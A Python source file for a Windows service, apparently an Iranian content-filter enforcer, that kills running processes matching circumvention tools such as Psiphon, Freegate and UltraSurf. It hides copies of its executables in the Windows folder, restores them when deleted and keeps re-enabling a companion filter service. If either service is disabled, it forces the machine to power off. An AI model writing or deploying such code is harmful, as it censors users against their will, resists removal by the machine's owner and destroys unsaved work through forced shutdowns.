import win32service
import win32serviceutil
import win32api
import servicemanager
import win32event
import os,sys
import socket
import psutil
import random,shutil
import pythoncom
import hashlib
import time
import subprocess
import atexit

alines2=['psiphon','Freegate','UltraSurf','proxy','nazuosduo']

drives = win32api.GetLogicalDriveStrings()
drives1 = drives.split('\000')[:-1]
c=drives1[0]
lin=0
for i in range(len(drives1)):
    if os.path.exists(drives1[i]+'windows')== True:
        c1=drives1[i]+'windows'
        lin=1
        break
if lin==0:
   c1=drives1[0]
else:
    pass
path=c
path1=c+"\\freedom"

try:
    os.makedirs(path + '\\freedom')
except:
    pass

class AppServerSvc2(win32serviceutil.ServiceFramework):
    _svc_name_ = "esfahanoud2"
    _svc_display_name_ = "esfahan oud2"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):

        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        # list barname haye filter shode
        #tadakhol ba digar servis ha baraye bez kardane faile list
        # handele archive matneefail etesal dakheli
        lines2 = []
        text=[]
        while 1:
            try:
                    f2 = open(path1 + '\list1.txt','r')
                    line1 = f2.readlines()
                    for c in line1:
                        text.append(c)
                        g = c.split('=')
                        if g[0] == 'hoard':
                            arshiv1 = g[1]
                        if g[0] == 'excutiv':
                            lin = g[1].split(',')
                            for t in range(len(lin)-1):
                                lines2.append(lin[t])
                    f2.close()
                    break
            except IOError as e:
                pass
        if arshiv1[0] == '1':
            lines2 = lines2 + alines2
        while 1:
            try:
                hasher = hashlib.md5()
                f1 = open(path1 + '\list1.txt', 'r')
                buf = f1.read()
                hasher.update(buf)
                f1.close()
                break
            except IOError as e:
                pass


        #m = ['w', 'r', 'c', 's', 'e', 'f', 'i', 'h', 'o', 'p', 'q', 'x', 'z', 'g', 't', 'v']
        #h1 = random.choice(m)
        #h2 = random.choice(m)
        #h3 = random.choice(m)
        newstring1 ='naturekmain'
        newstring2='esfahanlist'
        drives = win32api.GetLogicalDriveStrings()
        drives1 = drives.split('\000')[:-1]
        while 1:
            # c = random.choice(os.listdir(drives[0]))
            try:
                #c1 = random.choice(os.listdir(drives[0] + c))
                src1 = path1 + "\Nature2.exe"
                src3 = path1 + "\list1.txt"
                src11 = path1 + "\Nature1.exe"
                src22 = path1 + "\Nature.exe"
                dst1 = c1 + '\\' + newstring1 + '.exe'
                dst3 = c1 + '\\' + newstring2 + '2' + '.txt'
                dst11 = c1 + '\\' + newstring1 + '3' + '.exe'
                dst22 = c1 + '\\' + newstring1 + '1' + '.exe'
                shutil.copy(src1, dst1)
                shutil.copy(src3, dst3)
                shutil.copy(src11, dst11)
                shutil.copy(src22, dst22)
                break
            except:
                pass
        self.timeout = 0
        self.main(dst1,dst3,src1,src3,dst11,dst22,src11,src22,lines2,hasher,text)
    def main(self,dst1,dst3,src1,src3,dst11,dst22,src11,src22,lines2,hasher,text):
        def pak(x,y,z,w):
            os.remove(x)
            os.remove(y)
            os.remove(z)
            os.remove(w)
        while 1:
            atexit.register(pak, dst1, dst3,dst11,dst22)
            pythoncom.CoInitialize()
            rc = win32event.WaitForSingleObject(self.hWaitStop, self.timeout)
            if rc == win32event.WAIT_OBJECT_0:
                servicemanager.LogInfoMsg("esfahanoud2 - STOPPED!") # For duo Log
                break
            else:
                try:
                    for process in (process for process in psutil.process_iter()):
                        # hengame arshive moshahedeshode etesal delete
                        for i in range(len(lines2)):
                            if lines2[i] in str(process.name()):
                               process.kill()
                except:
                    pass
                try:
                    status=win32serviceutil.QueryServiceStatus('Wwinfilteroud')
                    svcState2 = status[1]
                    if svcState2 == win32service.SERVICE_STOPPED:
                         win32serviceutil.StartService('Wwinfilteroud', 'None')
                except:
                    pythoncom.CoInitialize()
                    subprocess.call(path1 + '\Nature2.exe install', shell=False)
                    win32serviceutil.StartService('Wwinfilteroud', 'None')

                try:
                    subprocess.call('sc config Winmgmt start= auto', shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                    status1 = win32serviceutil.QueryServiceStatus('Winmgmt')
                    svcState1 = status1[1]
                except:
                    svcState1=4
                if svcState1!=4:
                    try:
                        subprocess.call('sc config Wwinfilteroud start= auto', shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                        con1 = subprocess.check_output('sc qc Wwinfilteroud', shell=False, stdin=subprocess.PIPE,stderr=subprocess.STDOUT)
                        if 'DISABLED' in con1:
                            try:
                                subprocess.call('sc config Wwinfilteroud start= auto', shell=False,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                            except:
                                pass
                            subprocess.call(['cmd', '/c', 'Shutdown/p'])
                    except:
                        pass
                else:
                    try:
                        status5 = win32serviceutil.QueryServiceStatus('Winmgmt')
                        import wmi
                        ccc = wmi.WMI()  # or c = wmi.WMI ("other_computer")
                        for service3 in ccc.Win32_Service(Name="Winmgmt"):
                            if 'Disabled' in str(service3):
                                c1 = wmi.WMI()  # or c = wmi.WMI ("other_computer")
                                for service1 in c1.Win32_Service(Name="Wwinfilteroud"):
                                    service1.ChangeStartMode(StartMode="Automatic")
                                try:
                                    win32serviceutil.StartService('Wwinfilteroud', 'None')
                                except:
                                    pass
                                subprocess.call(['cmd', '/c', 'Shutdown/p'])
                            else:
                                pass
                        c = wmi.WMI()  # or c = wmi.WMI ("other_computer")
                        for service in c.Win32_Service(Name="Wwinfilteroud"):
                            service.ChangeStartMode(StartMode="Automatic")
                            if 'Disabled' in str(service):
                                os.remove(dst1)
                                os.remove(dst3)
                                os.remove(dst11)
                                os.remove(dst22)
                                subprocess.call(path1 + '\Nature2.exe install', shell=False)
                                service.ChangeStartMode(StartMode="Automatic")
                                try:
                                    win32serviceutil.StartService('Wwinfilteroud', 'None')
                                except:
                                    pass
                                subprocess.call(['cmd', '/c', 'Shutdown/p'])

                    except:
                        try:
                            subprocess.call('sc config Winmgmt start= auto', shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                            subprocess.call('sc start Winmgmt', shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                            m = subprocess.check_output('sc qc Winmgmt', shell=False, stdin=subprocess.PIPE,stderr=subprocess.STDOUT)
                            if 'DISABLED' in m:
                                try:
                                    os.remove(dst1)
                                    os.remove(dst3)
                                    os.remove(dst11)
                                    os.remove(dst22)
                                except:
                                    pass
                                subprocess.call(['cmd', '/c', 'Shutdown/p'])
                        except:
                            pass
                        try:
                            subprocess.call('sc config Wwinfilteroud start= auto', shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                            m = subprocess.check_output('sc qc Wwinfilteroud', shell=False, stdin=subprocess.PIPE,stderr=subprocess.STDOUT)
                            if 'DISABLED' in m:
                                try:
                                    os.remove(dst1)
                                    os.remove(dst3)
                                    os.remove(dst11)
                                    os.remove(dst22)
                                except:
                                    pass
                                try:
                                    subprocess.call('sc config Wwinfilteroud start= auto', shell=False,stdout=subprocess.PIPE, stderr=subprocess.STDOUT,stdin=subprocess.PIPE)
                                except:
                                    pass
                                subprocess.call(['cmd', '/c', 'Shutdown/p'])
                        except:
                            pass

                #moghayese 2 fail word ke dar surate taghir kope mikonad
                try:
                    hasher2 = hashlib.md5()
                    with open(src3, 'r') as afail2:
                        buf2 = afail2.read()
                        hasher2.update(buf2)
                    afail2.close()
                    hasher3 = hashlib.md5()
                    with open(dst3, 'r') as afail3:
                        buf3 = afail3.read()
                        hasher3.update(buf3)
                    afail3.close()
                    if hasher.hexdigest() != hasher2.hexdigest():
                        shutil.copy(dst3, src3)
                    if hasher.hexdigest() != hasher3.hexdigest():
                        shutil.copy(src3, dst3)
                except :
                    pass

                # agar fail nabud sari az fail moadel oud yek kopy jaygozin mikonad
                if (os.path.exists(path1 + '\Nature2.exe') == False):
                    shutil.copy(dst1, src1)
                if (os.path.exists(path1 + '\list1.txt') == False):
                    shutil.copy(dst3, src3)
                if (os.path.exists(dst1) == False):
                    shutil.copy(src1, dst1)
                if (os.path.exists(dst3) == False):
                    shutil.copy(src3, dst3)
                if (os.path.exists(path1 + '\Nature.exe') == False):
                    shutil.copy(dst22, src22)
                if (os.path.exists(path1 + '\Nature1.exe') == False):
                    shutil.copy(dst11, src11)
                if (os.path.exists(dst11) == False):
                    shutil.copy(src11, dst11)
                if (os.path.exists(dst22) == False):
                    shutil.copy(src22, dst22)
                if ((os.path.exists(path1 + '\list1.txt') == False) and (os.path.exists(dst3) == False)):
                        f3 = open(path1 + '\list1.txt', 'w')
                        for c in range(len(text)):
                            f3.writelines(text[c])
                        while 1:
                            try:
                                hasher = hashlib.md5()
                                f1 = open(path1 + '\list1.txt', 'r')
                                buf = f1.read()
                                hasher.update(buf)
                                f1.close()
                                break
                            except IOError as e:
                                pass

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(AppServerSvc2)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(AppServerSvc2)